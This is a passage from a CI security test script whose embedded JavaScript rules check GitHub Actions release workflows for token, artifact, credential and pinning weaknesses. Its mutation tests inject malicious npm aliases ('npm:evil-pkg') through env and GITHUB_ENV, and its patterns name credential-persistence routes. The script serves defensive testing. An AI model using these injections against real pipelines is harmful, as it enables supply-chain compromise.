      // so the pinned install could come from anywhere; and setup-node may
      // point the publish at the npm registry only.
      for (const [lvl, e] of [["workflow", doc.env], ["job", job.env], ...steps.map((st) => ["step " + (st.name ?? st.uses ?? ""), st.env])])
        for (const k of Object.keys(e ?? {}))
          if (/^npm_config_/i.test(k)) out.push(name + ": " + lvl + " env sets " + k + " in a job that publishes with id-token");
      for (const st of steps)
        if (String(st.uses ?? "").toLowerCase().startsWith("actions/setup-node@") && st.with?.["registry-url"] !== undefined &&
            String(st.with["registry-url"]).replace(/\/$/, "") !== "https://registry.npmjs.org")
          out.push(name + ": setup-node registry-url is " + JSON.stringify(st.with["registry-url"]) + ", not https://registry.npmjs.org");
      for (const line of lines)
        if (cmd("(?:bun|bunx|npx|yarn|pnpm|node|make|python3?|perl|ruby|deno|go)\\b").test(line) ||
            (npmRuns.test(line) && !(isGlobal(line) && !globalOther(line))) || globalOther(line))
          out.push(name + ": publishes with id-token and runs: " + line);
    }
    // publish-brain is the tarball-only shape (#682): no checkout, nothing
    // but setup-node and download-artifact, npm itself as the only global
    // install, a digest check, then a publish of a .tgz path. Allowlisted
    // rather than denylisted, so a step added later has to be argued for.
    // publish-sidecar is not this shape yet: it publishes from directories.
    if (name === "publish-brain") {
      const allowed = ["actions/setup-node@", "actions/download-artifact@"];
      for (const st of steps) {
        const u = String(st.uses ?? "");
        if (u && !allowed.some((a) => u.startsWith(a))) out.push(name + ": uses " + u + " (only setup-node and download-artifact)");
      }
      for (const line of lines)
        if (globalOther(line)) out.push(name + ": installs something other than npm@${NPM_VERSION} globally: " + line);
      const at = (re) => steps.findIndex((st) => typeof st.run === "string" && re.test(st.run));
      const verify = at(/\bsha256sum\s+-c\b/);
      const publish = at(/\bnpm\s+publish\b/);
      if (verify < 0 || verify > publish) out.push(name + ": no sha256sum -c of the tarball before npm publish");
      for (const st of steps)
        if (typeof st.run === "string" && /\bnpm\s+publish\b/.test(st.run) && !/\bnpm\s+publish\s+"[^"]*\.tgz"/.test(st.run.replace(/\$\{TARBALL\}/g, "x.tgz")))
          out.push(name + ": npm publish is not given a .tgz path (a directory publish runs its lifecycle scripts)");
    }
    // #817: a package manager runs maintainer scripts as root, which can read
    // the worker environment and memory, so on the release path a job that
    // can mint an OIDC token installs no OS or language packages: a mirror or
    // archive compromise must not reach the publishing or signing identity.
    // Whatever needs a package runs in a job without the token (osslsigncode
    // for post-sign verification moved out for exactly this).
    if (release && oidc) {
      for (const line of lines) {
        if (cmd("(?:apt-get|apt|aptitude|add-apt-repository|dpkg|snap|flatpak|brew|port|yum|dnf|apk|zypper|pacman|pip3?|pipx|uv|conda|mamba|nix|nix-env|gem|cargo|choco|winget|python3?\\s+-m\\s+pip)\\b").test(line))
          out.push(name + ": installs OS packages in a job holding id-token: " + line);
        // Text handed to another shell is a command this rule cannot read.
        if (cmd("(?:(?:ba|z|da)?sh\\s+-\\S*c|eval)\\b").test(line))
          out.push(name + ": runs shell text in a job holding id-token, which this rule cannot see into: " + line);
      }
      // And no action that could install anything: only what these jobs
      // use. Each one added has to be argued for here.
      const okUses = ["actions/checkout@", "actions/download-artifact@", "actions/upload-artifact@", "actions/setup-node@", "google-github-actions/auth@"];
      for (const st of steps) {
        const u = String(st.uses ?? "");
        if (u && !u.startsWith("./") && !okUses.some((a) => u.toLowerCase().startsWith(a)))
          out.push(name + ": uses " + u + " in a job holding id-token (only checkout, artifact transfer, setup-node and google-github-actions/auth)");
      }
    }
    // On the release path a job that can mint a token builds nothing: the
    // compiler, the module graph and dependency scripts run in a job without
    // id-token, and the result crosses with its digest.
    if (release && oidc) {
      for (const line of lines)
        if (cmd("go\\s+(?:build|install|generate|run|test|vet|mod|get)\\b").test(line) || /build-sidecar\.sh/.test(line) ||
            cmd("(?:bun|bunx|npx|yarn|pnpm|make|swiftc|swift|xcodebuild|clang|gcc|cc|cargo|cmake)\\b").test(line) ||
            (npmRuns.test(line) && !(isGlobal(line) && !globalOther(line))))
          out.push(name + ": builds in a job holding id-token: " + line);
      for (const st of steps)
        if (String(st.uses ?? "").startsWith("./"))
          out.push(name + ": runs local action " + st.uses + " in a job holding id-token");
    }
    // Artifacts are writable by every job in the run, so on the release path
    // a job holding id-token or a write scope takes one only by digest
    // (#781): the step right after each download runs `sha256sum -c` on a
    // digest that arrives as a job output (`needs.<job>.outputs`, which only
    // that job can set), under the same condition as the download.
    const privileged = oidc || perm === "write-all" || (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
    if (release && privileged) {
      // Action names are case-insensitive to GitHub.
      const isDownload = (st) => String(st.uses ?? "").toLowerCase().startsWith("actions/download-artifact@");
      for (const [i, st] of steps.entries()) {
        if (!isDownload(st)) continue;
        // A run of downloads is checked by the one step after the run
        // (#952 follow-up: publish-sidecar takes its five artifacts by name,
        // one download each). Only downloads may sit in between: they
        // extract and run nothing that reads what they fetched, and each one
        // is held below to the same condition as the check and to no
        // continue-on-error, as a lone download is. In a run of more than
        // one, each download names its artifact, no two alike, and the check
        // names every one of them, so a download slipped in front of an
        // existing check that never looks at it is still reported.
        let a = i, j = i + 1;
        while (a > 0 && isDownload(steps[a - 1])) a--;
        while (j < steps.length && isDownload(steps[j])) j++;
        const next = steps[j];
        if (j - a > 1) {
          const runNames = steps.slice(a, j).map((d) => d.with?.name);
          const nextCode = typeof next?.run === "string" ? next.run.split("\n").filter((l) => !/^\s*#/.test(l)).join("\n") : "";
          const nm = st.with?.name;
          if (typeof nm !== "string" || !nm || runNames.filter((x) => x === nm).length !== 1 || !nextCode.includes(nm))
            out.push(name + ": download " + JSON.stringify(nm ?? st.with?.pattern ?? "(all)") + " sits in a run of downloads, and is not one distinct artifact by name that the check after the run names");
        }
        const label = name + ": download " + JSON.stringify(st.with?.name ?? st.with?.pattern ?? "(all)");
        // The check, on a line that is not a comment, not excused by || true.
        const code = typeof next?.run === "string" ? next.run.split("\n").filter((l) => !/^\s*#/.test(l)).join("\n") : "";
        const checkLine = code.split("\n").find((l) => /\bsha256sum\b[^\n]*\s-c\b/.test(l));
        // The env vars that carry a job-output digest; the script must read
        // one of them, not merely have it in scope.
        const carriers = Object.entries(next?.env ?? {})
          .filter(([, v]) => /\$\{\{\s*needs\s*\.\s*[\w-]+\s*\.\s*outputs\s*\.\s*[\w-]+\s*\}\}/.test(String(v))).map(([k]) => k);
        if (!checkLine)
          out.push(label + " is not followed at once by a sha256sum -c of what it fetched");
        else if (!carriers.length)
          out.push(label + " is checked against no needs.<job>.outputs digest");
        else if (!carriers.some((k) => new RegExp("\\$\\{?" + k + "\\b").test(code)))
          out.push(label + " has a needs.<job>.outputs digest in env that its check never reads");
        // Its failure must end the step: no || after it (on its line or
        // continued onto the next), no if or ! around it, no set +e, and no
        // shell other than the default bash -e.
        // The check must also be the LAST command of its line: a pipe after it
        // (GitHub default shell is bash -e, without pipefail), a trailing &,
        // or a $( ) or backtick around it would each take its exit status.
        else if (/\|\|/.test(checkLine) || /^\s*(?:if|elif|while|until)\b|^\s*!/.test(checkLine) ||
                 !/\bsha256sum\b[^|;&)`]*\s-c\b[^|;&)`]*$/.test(checkLine) || /\$\(|`/.test(checkLine.split(/\bsha256sum\b/).slice(-2, -1)[0] ?? "") ||
                 /(?:^|[;&|]\s*)set\s+\+o\s+pipefail\b/m.test(code) ||
                 /(?:^|[;&|]\s*)set\s+\+[a-z]*e/m.test(code) || /(?:^|[;&|]\s*)set\s+\+o\s+errexit/m.test(code) ||
                 (next.shell !== undefined && !/^bash\s+-e\b|^bash$/.test(String(next.shell))))
          out.push(label + " is checked with a failure excused (||, if, !, a pipe, & or $( ) after or around it, set +e, set +o pipefail, or a shell without -e)");
        else if ((next.if ?? null) !== (st.if ?? null))
          out.push(label + " is checked under a different condition (" + JSON.stringify(next.if) + ") than it is downloaded (" + JSON.stringify(st.if) + ")");
        for (const s2 of [st, next])
          if (s2 && s2["continue-on-error"] !== undefined)
            out.push(label + ": continue-on-error on " + JSON.stringify(s2.name ?? s2.uses ?? "a step") + ", so a failed check would not stop the job");
      }
      // Other ways to fetch an artifact, which this rule cannot follow.
      for (const line of lines)
        if (/\bgh\s+run\s+download\b|\bactions\/(?:runs\/[^\s/]+\/)?artifacts\b/.test(line))
          out.push(name + ": fetches artifacts outside actions/download-artifact, which the digest rule cannot check: " + line);
      for (const st of steps)
        if (/^actions\/github-script@/i.test(String(st.uses ?? "")) && /artifact/i.test(String(st.with?.script ?? "")))
          out.push(name + ": github-script touching artifacts, which the digest rule cannot check");
      // #820: the artifact service itself. Its URL and token sit in the
      // environment of every JavaScript action and can be handed to a run:
      // step, so reading either one is a download route this rule cannot
      // follow. Run text without comments, plus every with: and env: value
      // of the step and the job (a github-script body is a with: value).
      const runtimeApi = /\bACTIONS_(?:RESULTS_URL|RUNTIME_TOKEN|RUNTIME_URL)\b/;
      if (runtimeApi.test(JSON.stringify(job.env ?? {})))
        out.push(name + ": job env reads the Actions runtime artifact API, which the digest rule cannot check");
      for (const [i, st] of steps.entries()) {
        const code = typeof st.run === "string" ? st.run.split("\n").map((l) => l.replace(/(^|\s)#(?!\{).*$/, "$1")).join("\n") : "";
        if (runtimeApi.test(code + JSON.stringify(st.with ?? {}) + JSON.stringify(st.env ?? {})))
          out.push(name + ": step " + (st.name ?? st.id ?? st.uses ?? String(i)) + " reads the Actions runtime artifact API (ACTIONS_RESULTS_URL, ACTIONS_RUNTIME_TOKEN, ACTIONS_RUNTIME_URL), which the digest rule cannot check");
      }
      // ...and every other action that fetches artifacts or hands the runtime
      // to later steps. Only actions/download-artifact is followed by the
      // digest check above, so any other action named for artifacts,
      // downloads or the runtime is one this rule cannot see into. An
      // unrecognised route is an allowed one, so this is by name and broad.
      for (const st of steps) {
        const u = String(st.uses ?? "").toLowerCase().split("@")[0];
        if (!u || u.startsWith("./") || u === "actions/download-artifact" || u === "actions/upload-artifact") continue;
        if (/artifact|download|runtime/.test(u))
          out.push(name + ": fetches artifacts through " + u + ", which the digest rule cannot check");
      }
    }
    // An artifact is a zip that any job in the run can write, and extraction
    // overwrites what is already there (#817 review). Downloaded into the
    // checkout, it can replace a checked-out script before the job runs it:
    // sign-windows.sh, with the KMS token in its environment. So on the
    // release path a job with a checkout downloads only into a directory the
    // repository does not have: under runner.temp, or a name that is not in
    // the tree. The default path is the workspace itself.
    if (release && steps.some((st) => String(st.uses ?? "").toLowerCase().startsWith("actions/checkout@")))
      for (const st of steps) {
        if (!String(st.uses ?? "").toLowerCase().startsWith("actions/download-artifact@")) continue;
        const p = String(st.with?.path ?? "").trim();
        const inTemp = /^\$\{\{\s*runner\.temp\s*\}\}(\/|$)/.test(p);
        const first = p.replace(/^\.\//, "").split("/")[0];
        // No climbing back out of runner.temp, and no home-relative path,
        // whose target this rule cannot know (#817 review).
        const climbs = p.split("/").some((seg) => seg.trim() === "..") || /^~/.test(p);
        if (climbs || (!inTemp && (!p || p === "." || /\$\{\{/.test(p) || fs.existsSync(process.env.REPO + "/" + first))))
          out.push(name + ": downloads " + JSON.stringify(st.with?.name ?? st.with?.pattern ?? "(all)") + " into " + JSON.stringify(p || "the workspace") + ", over the checkout, where it can replace a checked-out file");
      }
    // google-github-actions/auth writes a credentials file by default that
    // can mint further tokens; on the release path only access_token is used.
    if (release)
      for (const st of steps)
        if (String(st.uses ?? "").startsWith("google-github-actions/auth@") && st.with?.create_credentials_file !== false)
          out.push(name + ": google-github-actions/auth leaves a credentials file in the workspace (create_credentials_file is not false)");
    // No checkout leaves its token in .git/config on the release path, nor
    // (#982) in any job holding a write scope or reading a secret other than
    // GITHUB_TOKEN, whatever the workflow. release.yml is not on the release
    // path as defined above (no `release` environment, no id-token), so its
    // cut job left its PAT there for every later step. Every step after the
    // checkout can read the file, so a credential goes to the one step that
    // needs it, from that step env.
    const writesAny = perm === "write-all" || (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
    const readsSecret = [...JSON.stringify({ env: doc.env, job }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
      .some((m) => /\bsecrets\b(?!\s*\.\s*GITHUB_TOKEN\b)/i.test(m[1]));
    const isCheckout = (st) => String(st.uses ?? "").toLowerCase().startsWith("actions/checkout@");
    if (release || writesAny || readsSecret)
      for (const st of steps)
        if (isCheckout(st) && st.with?.["persist-credentials"] !== false)
          out.push(name + ": checkout leaves the token in .git/config (persist-credentials is not false)");
    // ...so a git command that talks to a remote, in a job whose checkouts
    // persist nothing, has no credential unless its step supplies one
    // (#982). Without one it fails, and the `|| true` a branch delete
    // usually carries turns that into a silent no-op. A helper given in the
    // step env counts: a GIT_CONFIG_KEY_n below GIT_CONFIG_COUNT naming a
    // credential helper, with a value. The token in the remote URL does not
    // count (see below).
    const checkouts = steps.filter(isCheckout);
    const gitRemote = cmd("git\\s+(?:(?:-[cC]|--(?:git-dir|work-tree|namespace|exec-path|config-env))\\s+\\S+\\s+|--?[\\w-]+(?:=\\S+)?\\s+)*(?:push|fetch|pull|ls-remote)\\b");
    const stepLines = (st) => (typeof st.run === "string" ? st.run : "").replace(/\\\n/g, " ").split("\n").map((l) => stripComment(l).trim());
    // The env a step runs with, as GitHub builds it: workflow, then job,
    // then step, a later level overriding an earlier one.
    const envOf = (st) => ({ ...(doc.env ?? {}), ...(job.env ?? {}), ...(st.env ?? {}) });
    // GIT_CONFIG_KEY_<n> as git reads it: n in plain decimal (no leading
    // zero) and below GIT_CONFIG_COUNT.
    const envConfig = (e) => {
      const n = Number(e.GIT_CONFIG_COUNT ?? 0);
      return Object.entries(e).flatMap(([k, v]) => {
        const m = /^GIT_CONFIG_KEY_(\d+)$/.exec(k);
        return m && m[1] === String(Number(m[1])) && Number(m[1]) < n ? [[String(v), String(e["GIT_CONFIG_VALUE_" + m[1]] ?? "")]] : [];
      });
    };
    const helpers = (st) => envConfig(envOf(st)).filter(([k]) => /^credential\.(?:.+\.)?helper$/i.test(k)).map(([, v]) => v);
    if (checkouts.length && checkouts.every((st) => st.with?.["persist-credentials"] === false))
      for (const [i, st] of steps.entries()) {
        if (!stepLines(st).some((l) => gitRemote.test(l))) continue;
        if (!helpers(st).some((v) => v !== ""))
          out.push(name + ": step " + (st.name ?? st.id ?? String(i)) + " runs git against a remote with no credential: the checkout persists none and the step env gives no credential helper");
      }
    // A helper given that way answers from the step env and stores nothing:
    // an inline `!f() { ... }; f` that names no storing helper and writes
    // no file. Anything else (store, cache, a credential manager, or an
    // inline one that calls them) keeps what git hands it after a push, on
    // disk or in a daemon every later step can ask.
    for (const [i, st] of steps.entries())
      for (const v of helpers(st))
        if (v !== "" && (!/^!f\(\)\s*\{[\s\S]*\};\s*f$/.test(v) || /credential-(?:store|cache)|\bgh\s+auth\b|>/.test(v)))
          out.push(name + ": step " + (st.name ?? st.id ?? String(i)) + " configures the credential helper " + JSON.stringify(v) + ", which keeps the credential after the step");
    // Git config given in the environment reaches every step that env
    // reaches, so at the job or workflow level it is the persisted
    // credential again; and an extraheader, insteadOf or helper value given
    // as GIT_CONFIG_PARAMETERS, or a GIT_CONFIG_GLOBAL file, is git config
    // this rule cannot read.
    for (const [lvl, e] of [["workflow env", doc.env ?? {}], ["job env", job.env ?? {}]])
      for (const k of Object.keys(e))
        if (/^GIT_CONFIG_(?:COUNT|KEY_\d+|VALUE_\d+|PARAMETERS|GLOBAL|SYSTEM)$/.test(k))
          out.push(name + ": " + lvl + " sets " + k + ", git config every step of the job reads");
    for (const [i, st] of steps.entries()) {
      for (const k of Object.keys(st.env ?? {}))
        if (/^GIT_CONFIG_(?:PARAMETERS|GLOBAL|SYSTEM)$/.test(k))
          out.push(name + ": step " + (st.name ?? st.id ?? String(i)) + " sets " + k + ", git config this rule cannot read");
      for (const [k] of envConfig(st.env ?? {}))
        if (/extraheader|\.insteadof$/i.test(k))
          out.push(name + ": step " + (st.name ?? st.id ?? String(i)) + " sets " + k + " through the environment; give a credential helper instead");
    }
    // Nor may a job that holds a credential put it back where the checkout
    // no longer does: an extraheader or helper in git config (on disk, or on
    // a command line every process can read), a .git-credentials, .netrc or
    // .gitconfig file, a storing helper run directly, or gh auth, which
    // writes its token under ~/.config. Continuation lines joined.
    const joined = runs.replace(/\\\n/g, " ").split("\n").map((l) => stripComment(l).trim());
    if (release || writesAny || readsSecret)
      for (const line of joined)
        if (/\bgit\b.*\bconfig\b.*(?:extraheader|\bcredential\.|\.insteadof\b)/i.test(line) || /\bgit\b.*\s-c\s+["\x27]?[^\s=]*(?:extraheader|credential\.)/i.test(line) ||
            /\.git-credentials\b|(?:^|[^\w.-])\.(?:netrc|gitconfig)\b|\bcredential-(?:store|cache)\b|\bgh\s+auth\s+(?:login|setup-git)\b/.test(line))
          out.push(name + ": writes a git credential where every later step can read it: " + line);
    // Nor a credential in a URL (#982): git and curl print the URL they
    // failed on, where only the secret itself is masked and nothing derived
    // from it, and a URL argument is visible to every process on the runner.
    // A credential is an expression, a variable, a command substitution or
    // a printf slot in the userinfo. Run text, and every env (workflow,
    // job, container, services, step) and with value.
    const credUrl = /\bhttps?:\/\/[^\s\/@]*(?:\$\{\{[\s\S]*?\}\}|\$\{?[A-Za-z_]\w*\}?|\$\([^)]*\)|`[^`]*`|%s)[^\s\/@]*@/i;
    const vals = (o) => Object.values(o ?? {}).map(String);
    const urlTexts = [...joined, ...vals(doc.env), ...vals(job.env), ...vals(job.container?.env),
      ...Object.values(job.services ?? {}).flatMap((sv) => vals(sv?.env)),
      ...steps.flatMap((st) => [...vals(st.env), ...vals(st.with)])];
    for (const t of urlTexts)
      if (credUrl.test(t))
        out.push(name + ": puts a credential in a URL, which git and curl print in their errors: " + t);
    for (const st of steps)
      if (String(st.uses ?? "").startsWith("docker/login-action@") && "dry_run" in ((doc.on ?? doc[true] ?? {}).workflow_dispatch?.inputs ?? {}) &&
          !/env\.DRY_RUN\s*!=\s*.true./.test(String(st.if ?? "")))
        out.push(name + ": logs in to a registry on a dry run");
  }
}
if (rule === "pushcache") {
  // #782: a job that ships an image builds it cold. The GHA cache is
  // writable by any run on main and by every job in the same run, so a job
  // that both restores from it and ships can ship layers nobody built in
  // that job. "Ships" is either of:
  //   - pushes: a build-push or bake step whose push is not false or whose
  //     outputs push, a registry login, or a `docker push`, `buildx ...
  //     --push`, `imagetools create` or skopeo/crane/regctl/oras write;
  //   - (#868) builds an image and uploads any artifact: what it uploads
  //     may be that image, for a later job to push. Since #868 the release
  //     image is built that way, by a job with no registry scope, and pushed
  //     from the archive after approval, so the build that ships pushes
  //     nothing itself. Any upload counts, not only one whose path matches
  //     the build output (#868 review: a parent directory, or the same
  //     expression spaced differently, slipped past that), and a classic
  //     docker build counts as a build.
  // Every image build in such a job is held to it, so a rehearsal builds
  // what the release does.
  for (const [name, job] of Object.entries(jobs)) {
    const steps = flatSteps(job.steps).map((x) => x.st);
    const u = (st) => String(st.uses ?? "").toLowerCase();
    const isBuild = (st) => /^docker\/(build-push-action|bake-action)@/.test(u(st));
    const isUpload = (st) => /^actions\/upload-artifact@/.test(u(st));
    const runs = steps.map((st) => typeof st.run === "string" ? st.run : "").join("\n");
    // `outputs: type=image,...,push=true` (or type=registry) pushes as surely
    // as `push: true` does (#680: build-image pushed by digest that way).
    const pushes = steps.some((st) => isBuild(st) && (String(st.with?.push ?? "false") !== "false" ||
        /(?:^|[,\s])push\s*=\s*(?:true|1|t)\b|(?:^|[,\s])type\s*=\s*registry\b/i.test(String(st.with?.outputs ?? "")))) ||
      steps.some((st) => /^docker\/login-action@/.test(u(st))) ||
      // Global flags may sit before the subcommand (skopeo --debug copy).
      /\bdocker(?:\s+-{1,2}\S+(?:\s+(?!-)\S+)?)*\s+(?:(?:image|manifest)\s+)?push\b|\bbuildx\s+(?:build|bake)\b[^\n]*--push\b|\bimagetools\s+create\b|\b(?:skopeo|crane|regctl|oras)(?:\s+-{1,2}\S+(?:\s+(?!-)\S+)?)*\s+(?:copy|cp|push|sync|mutate|append|image\s+copy|index\s+create)\b/.test(runs);
    const builds = steps.some(isBuild) || /\bdocker\s+(?:image\s+)?build\b|\bbuildx\s+(?:build|bake)\b/.test(runs);
    const uploadsArchive = builds && steps.some(isUpload);
    if (!pushes && !uploadsArchive) continue;
    const why = pushes ? "pushes to a registry" : "builds an image and uploads an artifact, which may be that image";
    for (const [i, st] of steps.entries()) {
      const label = name + ": step " + (st.name ?? st.id ?? st.uses ?? String(i));
      if (isBuild(st) && st.with?.["cache-from"] !== undefined)
        out.push(label + " restores cache-from " + JSON.stringify(st.with["cache-from"]) + " in a job that " + why);
      if (isBuild(st) && /cache-from/.test(JSON.stringify(st.with?.set ?? "")))
        out.push(label + " sets cache-from through bake in a job that " + why);
      if (typeof st.run === "string" && /--cache-from\b/.test(st.run))
        out.push(label + " runs a build with --cache-from in a job that " + why);
    }
  }
}
if (rule === "npmpin") {
  // #960: `npm install -g "npm@${NPM_VERSION}"` is exempted by text in the
  // npm publish jobs (narrow, release-exec.test.sh), which is sound only
  // while NPM_VERSION is the workflow pin: an exact x.y.z, set once at the
  // top. Set again below that -- by a job, a step, a container, a script or
  // $GITHUB_ENV -- it could name anything, an npm: alias of another package
  // included, and that package would be installed globally with its
  // lifecycle scripts in a job holding id-token. Names compared ignoring
  // case, as a Windows runner does.
  const isPin = (k) => /^npm_version$/i.test(k);
  const npmCheck = "[[ \"$NPM_VERSION\" =~ ^[0123456789]+\\.[0123456789]+\\.[0123456789]+$ ]] || { echo \"::error::NPM_VERSION is not an exact x.y.z, so it could name another package (#960)\"; exit 1; }";
  for (const e of [doc.env, ...Object.values(jobs).map((j) => j.env)])
    for (const v of Object.values(e ?? {}))
      if (/^\s*npm_version\s*=/im.test(String(v))) out.push("an env value sets NPM_VERSION when written to GITHUB_ENV: " + JSON.stringify(v));
  for (const [k, v] of Object.entries(doc.env ?? {}))
    if (isPin(k) && !/^\d+\.\d+\.\d+$/.test(String(v))) out.push("env." + k + " is " + JSON.stringify(v) + ", not an exact x.y.z");
  for (const [name, job] of Object.entries(jobs)) {
    for (const k of Object.keys(job.env ?? {})) if (isPin(k)) out.push(name + ": sets " + k + " over the workflow pin");
    for (const k of Object.keys(job.container?.env ?? {})) if (isPin(k)) out.push(name + ": its container sets " + k + " over the workflow pin");
    for (const [i, { st, via }] of flatSteps(job.steps).entries()) {
      const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
      for (const k of Object.keys(st.env ?? {})) if (isPin(k)) out.push(label + " sets " + k + " over the workflow pin");
      // The pinned install is checked where it runs (#960 review): the line
      // before it in the same script is the exact x.y.z test, so a value set
      // any way this rule cannot read (a default shell, BASH_ENV, a sourced
      // file, a GITHUB_ENV line built from env) still stops the step.
      const code = (typeof st.run === "string" ? st.run : "").split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
      code.forEach((l, j) => {
        if (/npm@\$\{?npm_version\b/i.test(l) && code[j - 1] !== npmCheck)
          out.push(label + " installs npm@${NPM_VERSION} without the exact-version check on the line before it");
      });
      if (code.some((l) => /npm@\$\{?npm_version\b/i.test(l)) && (st["continue-on-error"] !== undefined || job["continue-on-error"] !== undefined))
        out.push(label + " installs npm@${NPM_VERSION} in a step or job that may continue on error");
      for (const v of Object.values(st.env ?? {}))
        if (/^\s*npm_version\s*=/im.test(String(v))) out.push(label + " has an env value that sets NPM_VERSION when written to GITHUB_ENV");
      // An assignment (plain, +=, ${X:=...}, export and friends, read,
      // printf -v) or a GITHUB_ENV line, which is the same text; comments
      // dropped.
      const run = (typeof st.run === "string" ? st.run : "").split("\n").filter((l) => !/^\s*#/.test(l)).join("\n");
      if (/(?:^|[\s;&|(`"\x27])npm_version\+?=|\$\{npm_version:?=|\b(?:export|declare|typeset|local|readonly|read)\s+(?:-\w+\s+)*npm_version\b|\bprintf\s+-v\s*npm_version\b/im.test(run))
        out.push(label + " sets NPM_VERSION in its script (for itself, or for later steps through GITHUB_ENV)");
    }
  }
}
if (rule === "pinned") {
  const uses = [];
  for (const [name, job] of Object.entries(jobs)) {
    if (typeof job.uses === "string") uses.push([name, job.uses]);
    for (const { st, via } of flatSteps(job.steps)) if (typeof st.uses === "string") uses.push([name + (via ? " (via " + via.slice(0, -3) + ")" : ""), st.uses]);
  }
  for (const [name, u] of uses)
    if (!u.startsWith("./") && !/^[^@\s]+@[0-9a-f]{40}$/.test(u))
      out.push(name + ": uses " + u + " (not a full commit SHA)");
}
if (out.length) console.log(out.join("\n"));
'
}

# expect_clean <label> <rule> <file>
expect_clean() {
	local found
	found="$(check "$2" "$3")" || {
		no "$1" "the bun helper failed"
		return
	}
	if [ -z "$found" ]; then ok "$1"; else no "$1" "$found"; fi
}

# expect_caught <label> <rule> <file> <exact text> <replacement> [reason]
# With a reason, the report must contain it: a mutant that some OTHER rule
# happens to report proves nothing about the rule it was written for.
expect_caught() {
	local copy="${WORK}/mutant.yml"
	if ! FROM="$3" TO="$copy" OLD="$4" NEW="$5" bun -e '
const s = await Bun.file(process.env.FROM).text();
const n = s.split(process.env.OLD).length - 1;
if (n < 1) { console.error("anchor not found"); process.exit(2); }
await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
'; then
		no "mutant '$1' could be applied (the workflow no longer has the text it mutates)"
		return
	fi
	local found
	found="$(check "$2" "$copy")"
	if [ -z "$found" ]; then
		no "reports: $1" "the check passed a workflow with this hole"
	elif [ -n "${6:-}" ] && ! grep -qF -- "$6" <<<"$found"; then
		no "reports: $1, for the reason it exists" "wanted '${6}', got:
${found}"
	else
		ok "reports: $1"
	fi
}

echo "every job's token scope is explicit"
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f")" scoped "$f"
done

echo
echo "the publish path holds nothing by default"
expect_clean "release-exec.yml: permissions {} at the top, every job explicit" publish-perms "$WORKFLOWS/release-exec.yml"

echo
echo "every action in a workflow that holds authority is pinned to a commit"
held=0
for f in "$WORKFLOWS"/*.yml; do
	auth="$(check authority "$f")" || {
		no "$(basename "$f"): authority check ran" "the bun helper failed"
		continue
	}
	[ -n "$auth" ] || continue
	held=$((held + 1))
	expect_clean "$(basename "$f")" pinned "$f"
	expect_clean "$(basename "$f"): fetches nothing by a floating version or an undigested image" mutable "$f"
done
# Both npm publishers install the same npm, so a bump cannot leave one on
# the version Trusted Publishing was proven with and the other not.
npm_pins="$(for f in release-exec.yml sidecar-release.yml; do
	FILE="$WORKFLOWS/$f" bun -e 'console.log(JSON.stringify(Bun.YAML.parse(await Bun.file(process.env.FILE).text()).env?.NPM_VERSION))'
done | sort -u)"
if [ "$(printf '%s\n' "$npm_pins" | wc -l)" -eq 1 ] && [[ "$npm_pins" =~ ^\"[0-9]+\.[0-9]+\.[0-9]+\"$ ]]; then
	ok "release-exec.yml and sidecar-release.yml pin the same exact npm (${npm_pins})"
else
	no "release-exec.yml and sidecar-release.yml pin the same exact npm" "got: ${npm_pins}"
fi
# ...and nothing below the workflow level sets NPM_VERSION again (#960), in
# any workflow: the npm publishers exempt `npm install -g "npm@${NPM_VERSION}"`
# by its text, so the variable has to be the pin wherever that line runs.
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f"): NPM_VERSION is set once, at the top, to an exact version" npmpin "$f"
done
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'a job setting NPM_VERSION to an npm: alias over the pin (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    env:\n      NPM_VERSION: "npm:evil-pkg@12.1.0"\n    # Same requirement' \
		'publish-sidecar: sets NPM_VERSION over the workflow pin'
	expect_caught 'a step setting NPM_VERSION to an npm: alias over the pin (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          NPM_VERSION: "npm:evil-pkg@12.1.0"\n        run: |' \
		'publish-brain: step Ensure npm supports Trusted Publishing sets NPM_VERSION over the workflow pin'
	expect_caught 'a step setting npm_version in another case (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |' $'      - name: Ensure npm supports Trusted Publishing\n        env:\n          npm_version: "npm:evil-pkg@12.1.0"\n        run: |' \
		'publish-sidecar: step Ensure npm supports Trusted Publishing sets npm_version over the workflow pin'
	expect_caught 'NPM_VERSION set for later steps through GITHUB_ENV (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Ensure npm supports Trusted Publishing\n        run: |\n          set -euo pipefail\n' $'      - name: Ensure npm supports Trusted Publishing\n        run: |\n          set -euo pipefail\n          echo "NPM_VERSION=npm:evil-pkg@12.1.0" >> "$GITHUB_ENV"\n' \
		'sets NPM_VERSION in its script'
	expect_caught 'NPM_VERSION assigned in the script that installs npm (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          export NPM_VERSION=npm:evil-pkg@12.1.0\n          # Checked where it is used' \
		'sets NPM_VERSION in its script'
	expect_caught 'NPM_VERSION defaulted with := in the script (#960)' npmpin "$WORKFLOWS/release-exec.yml" \
		'          npm install -g "npm@${NPM_VERSION}"' '          npm install -g "npm@${NPM_VERSION:=npm:evil-pkg@12.1.0}"' \
		'sets NPM_VERSION in its script'
	expect_caught 'the workflow pin itself an npm: alias (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
		'  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "npm:evil-pkg@12.1.0"' \
		'env.NPM_VERSION is "npm:evil-pkg@12.1.0", not an exact x.y.z'
	expect_caught 'a job container setting NPM_VERSION (#960)' npmpin "$WORKFLOWS/sidecar-release.yml" \
